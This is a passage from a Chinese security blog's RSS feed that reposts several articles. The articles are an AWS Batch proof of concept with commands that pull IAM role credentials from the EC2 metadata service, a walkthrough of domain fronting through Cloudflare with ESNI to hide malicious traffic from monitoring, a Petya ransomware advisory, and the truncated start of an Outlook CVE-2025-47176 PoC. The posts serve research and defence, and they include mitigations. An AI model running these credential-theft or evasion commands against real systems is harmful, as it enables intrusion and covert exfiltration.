&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws batch register-job-definition &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --job-definition-name poc-get-rolename &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --type container &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --container-properties &lt;span class=&#34;s1&#34;&gt;&amp;#39;{
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;image&amp;#34;: &amp;#34;curlimages/curl&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;command&amp;#34;: [&amp;#34;sh&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;TOKEN=`curl -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600`; curl -H X-aws-ec2-metadata-token:$TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/&amp;#34;]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;  }&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;步骤2 - 获取角色凭证&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws batch register-job-definition &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --job-definition-name poc-get-aimcreds &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --type container &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --container-properties &lt;span class=&#34;s1&#34;&gt;&amp;#39;{
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;image&amp;#34;: &amp;#34;curlimages/curl&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;command&amp;#34;: [&amp;#34;sh&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;TOKEN=`curl -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600`; curl -H X-aws-ec2-metadata-token:$TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME&amp;#34;]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;  }&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;安全建议&#34;&gt;安全建议
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;审计人员检查清单&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;确认任务执行上下文是否限制IMDS访问&lt;/li&gt;
&lt;li&gt;审查EC2编排环境中的实例角色权限&lt;/li&gt;
&lt;li&gt;检查是否过度分配&lt;code&gt;RegisterJobDefinition/SubmitJob&lt;/code&gt;权限&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;开发者防护措施&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;网络层限制IMDS访问（通过&lt;code&gt;aws ec2 modify-instance-metadata-options&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;遵循最小权限原则配置任务角色&lt;/li&gt;
&lt;li&gt;考虑使用Fargate替代EC2编排类型&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;实践资源&#34;&gt;实践资源
&lt;/h3&gt;&lt;p&gt;漏洞复现环境已开源：&lt;a class=&#34;link&#34; href=&#34;https://github.com/doyensec/cloudsec-tidbits/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CloudSecTidbits实验室&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;延伸阅读&#34;&gt;延伸阅读
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://docs.aws.amazon.com/batch/latest/userguide/what-is-batch.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;AWS Batch官方文档&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.doyensec.com/2023/03/13/aws-metadata-service-container-security.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;容器工作负载中的元数据服务安全&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>通过Cloudflare实现域名伪装(ESNI技术解析)</title>
        <link>http://localhost:1313/p/%E9%80%9A%E8%BF%87cloudflare%E5%AE%9E%E7%8E%B0%E5%9F%9F%E5%90%8D%E4%BC%AA%E8%A3%85esni%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 01:39:57 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%80%9A%E8%BF%87cloudflare%E5%AE%9E%E7%8E%B0%E5%9F%9F%E5%90%8D%E4%BC%AA%E8%A3%85esni%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;通过cloudflare实现域名伪装&#34;&gt;通过Cloudflare实现域名伪装
&lt;/h1&gt;&lt;p&gt;在开始本文之前，我认为有必要先讨论&amp;quot;域名伪装&amp;quot;(Domain Fronting)这个术语及其可能的定义。如果您只关心如何隐藏通信内容，可以直接跳过本节。&lt;/p&gt;
&lt;h2 id=&#34;定义域名伪装&#34;&gt;定义&amp;quot;域名伪装&amp;quot;
&lt;/h2&gt;&lt;p&gt;从红队视角来看，域名伪装意味着将一个恶意网站的请求隐藏在看似访问无害网站的请求中。从技术角度，这可以描述为将网络层设置与特定虚拟主机的应用层请求解耦。如果观察者只能看到网络层指向&amp;quot;好&amp;quot;域名(或未被标记为恶意的域名)，那么攻击就成功了。&lt;/p&gt;
&lt;h2 id=&#34;实际技术内容&#34;&gt;实际技术内容
&lt;/h2&gt;&lt;p&gt;当我发布关于域名伪装的基础文章时，@sehnaoui在推特上分享了链接，并收到Cloudflare解决方案工程团队负责人Suzanne的回复：&lt;/p&gt;
&lt;p&gt;首先，我并未声称该技术在Cloudflare上有效，文中对Cloudflare的唯一提及是将其作为CDN的示例。&lt;/p&gt;
&lt;p&gt;以下是使用文章中讨论的技术在Cloudflare上实现域名伪装的演示：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ curl -s -H &lt;span class=&#34;s1&#34;&gt;$&amp;#39;Host: frontmecf.vuln-demo.com&amp;#39;&lt;/span&gt; http://digininja.org.uk
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;p&amp;gt;Vuln Demo site fronted by Cloudflare&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;设置过程相当简单：我注册了Cloudflare账户，添加了digininja.org.uk域名并完成设置流程(包括将域名的NS记录转移到Cloudflare)。同时添加了vuln-demo.com账户但未完成设置，该域名保持&amp;quot;Pending Nameserver Update&amp;quot;状态。&lt;/p&gt;
&lt;p&gt;为了证明这不是因为两个域名在同一账户下，我们尝试另一个由Cloudflare托管的知名域名：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ curl -s -H &lt;span class=&#34;s1&#34;&gt;$&amp;#39;Host: frontmecf.vuln-demo.com&amp;#39;&lt;/span&gt; http://cloudflare.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;p&amp;gt;Vuln Demo site fronted by Cloudflare&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;是的，我确实通过Cloudflare实现了域名伪装！&lt;/p&gt;
&lt;h2 id=&#34;https场景下的挑战&#34;&gt;HTTPS场景下的挑战
&lt;/h2&gt;&lt;p&gt;当我尝试在HTTPS上实现相同效果时，遇到了问题：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ curl -s -H &lt;span class=&#34;s1&#34;&gt;$&amp;#39;Host: frontmecf.vuln-demo.com&amp;#39;&lt;/span&gt; https://cloudflare.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;403 Forbidden&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;body &lt;span class=&#34;nv&#34;&gt;bgcolor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;white&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;403 Forbidden&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;cloudflare&amp;lt;/center&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;经过分析发现，Cloudflare在建立连接时会检查SNI(Server Name Indication)字段和Host头是否匹配。SNI在TLS握手过程中以明文形式发送，告知服务器应提供哪个证书。&lt;/p&gt;
&lt;h2 id=&#34;使用esni技术突破限制&#34;&gt;使用ESNI技术突破限制
&lt;/h2&gt;&lt;p&gt;ESNI(Encrypted SNI)作为TLS 1.3规范的一部分，可以加密SNI信息。虽然ESNI是新兴技术，但OpenSSL开发者Stephen Farrell已经实现了相关功能。&lt;/p&gt;
&lt;p&gt;以下是使用ESNI成功实现域名伪装的示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;LD_LIBRARY_PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/home/robin/src/openssl
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nv&#34;&gt;ESNIRR&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;dig +short txt _esni.www.cloudflare.com &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sed -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;s/&amp;#34;//g&amp;#39;&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;cat get_digininja.org&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;sleep 5&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /home/robin/src/openssl/apps/openssl s_client &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;-CApath /etc/ssl/certs/ -tls1_3 -connect www.cloudflare.com:443 -esni digininja.org.uk &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;-esnirr &lt;span class=&#34;nv&#34;&gt;$ESNIRR&lt;/span&gt; -esni_strict -servername www.cloudflare.com
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;通过Wireshark抓包分析确认，ESNI扩展(0xFFCE)中的信息确实被加密，不再暴露真实域名。&lt;/p&gt;
&lt;h2 id=&#34;防御视角的启示&#34;&gt;防御视角的启示
&lt;/h2&gt;&lt;p&gt;对于防御者而言，如果仅依赖DNS查询和SNI主机名进行监控，这些信息已不再可信，因为它们完全处于攻击者控制之下。&lt;/p&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;无论您称之为域名伪装、域名隐藏还是其他名称，本文展示了如何利用ESNI和自定义Host头将&amp;quot;恶意&amp;quot;HTTP请求隐藏在看似&amp;quot;良性&amp;quot;的请求中。由于ESNI受到隐私倡导者的支持，这项技术可能会长期有效。同时能够在监控系统日志中留下虚假标记也是一个额外优势。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Petya勒索软件攻击事件技术分析与防护措施</title>
        <link>http://localhost:1313/p/petya%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD/</link>
        <pubDate>Sun, 03 Aug 2025 01:18:11 +0800</pubDate>
        
        <guid>http://localhost:1313/p/petya%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD/</guid>
        <description>&lt;h3 id=&#34;petya勒索软件攻击事件更新&#34;&gt;Petya勒索软件攻击事件更新
&lt;/h3&gt;&lt;p&gt;与近期WannaCrypt事件类似，我们再次遭遇名为Petya的勒索软件攻击。早期报告中存在大量相互矛盾的信息，包括对无关数据和误导性内容的混淆。微软团队迅速展开调查分析，使我们的恶意软件防护团队能够发布检测签名。&lt;/p&gt;
&lt;h4 id=&#34;攻击技术分析&#34;&gt;攻击技术分析
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;初始感染途径&lt;/strong&gt;：恶意软件最初通过乌克兰公司M.E.doc财务软件的更新服务传播（该软件在乌克兰和俄罗斯广泛使用）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;横向移动技术&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;利用未修复的漏洞CVE-2017-0144和CVE-2017-0145进行网络传播（微软已于2017年3月发布修复补丁MS17-010）&lt;/li&gt;
&lt;li&gt;当漏洞利用失效时，会采用凭证窃取、网络遍历等其他感染手段&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;防护方案&#34;&gt;防护方案
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;紧急措施&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;立即安装安全更新MS17-010&lt;/li&gt;
&lt;li&gt;无法安装补丁的用户可禁用SMBv1（操作步骤见KB2696547）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;增强防护&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;实施网络分段和最小权限账户策略&lt;/li&gt;
&lt;li&gt;Windows 10用户可使用Device Guard限制设备仅运行可信应用&lt;/li&gt;
&lt;li&gt;部署Windows Defender高级威胁防护(ATP)自动检测勒索软件行为&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;微软将持续调查并采取必要措施保护客户安全。当前威胁形势表明，网络犯罪分子会不断调整攻击方式，需要同等级别的防御措施应对。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;技术资源&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://blogs.technet.microsoft.com/mmpc/2017/06/27/new-ransomware-old-techniques-petya-adds-worm-capabilities/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;微软恶意软件防护中心分析报告&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://blogs.technet.microsoft.com/mmpc/2017/06/08/windows-10-creators-update-hardens-security-with-next-gen-defense/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Windows 10创作者更新中的新一代勒索软件防护&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.microsoft.com/en-us/security/portal/threat/encyclopedia/Entry.aspx?Name=Ransom:Win32/Petya&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Petya恶意软件百科条目&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Microsoft Outlook远程代码执行漏洞(CVE-2025-47176)技术分析</title>
        <link>http://localhost:1313/p/microsoft-outlook%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2025-47176%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 01:07:04 +0800</pubDate>
        
        <guid>http://localhost:1313/p/microsoft-outlook%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2025-47176%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;microsoft-outlook---远程代码执行rce&#34;&gt;Microsoft Outlook - 远程代码执行(RCE)
&lt;/h1&gt;&lt;h1 id=&#34;作者-nu11secur1ty&#34;&gt;作者: nu11secur1ty
&lt;/h1&gt;&lt;h1 id=&#34;日期-2025-07-08&#34;&gt;日期: 2025-07-08
&lt;/h1&gt;&lt;h1 id=&#34;厂商-microsoft&#34;&gt;厂商: Microsoft
&lt;/h1&gt;&lt;h1 id=&#34;软件&#34;&gt;软件: &lt;a class=&#34;link&#34; href=&#34;https://www.microsoft.com/en-us/microsoft-365/outlook/log-in&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.microsoft.com/en-us/microsoft-365/outlook/log-in&lt;/a&gt;
&lt;/h1&gt;&lt;h1 id=&#34;参考&#34;&gt;参考:
&lt;/h1&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47176&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47176&lt;/a&gt; &amp;gt;
&lt;a class=&#34;link&#34; href=&#34;https://www.cloudflare.com/learning/security/what-is-remote-code-execution/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.cloudflare.com/learning/security/what-is-remote-code-execution/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;cve-2025-47176&#34;&gt;CVE-2025-47176
&lt;/h1&gt;&lt;h2 id=&#34;漏洞描述&#34;&gt;漏洞描述
&lt;/h2&gt;&lt;p&gt;本概念验证(PoC)演示了CVE-2025-47176漏洞的模拟利用。它通过向Outlook注入特制邮件项，其中包含恶意同步路径，在扫描过程中触发特定操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;重要提示:&lt;/strong&gt;
此PoC模拟了Outlook存在漏洞的路径解析功能，当检测到恶意路径时会触发&lt;strong&gt;系统重启&lt;/strong&gt;。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;使用maliciousprf进行附加测试&#34;&gt;使用malicious.prf进行附加测试
&lt;/h2&gt;&lt;p&gt;您也可以通过导入特制的Outlook配置文件(&lt;code&gt;malicious.prf&lt;/code&gt;)来测试此PoC:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;将&lt;code&gt;malicious.prf&lt;/code&gt;放在与&lt;code&gt;PoC.py&lt;/code&gt;相同的目录下&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用导入命令运行Outlook:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;importprf&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malicious&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;prf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;使用方法&#34;&gt;使用方法
&lt;/h2&gt;&lt;ol&gt;
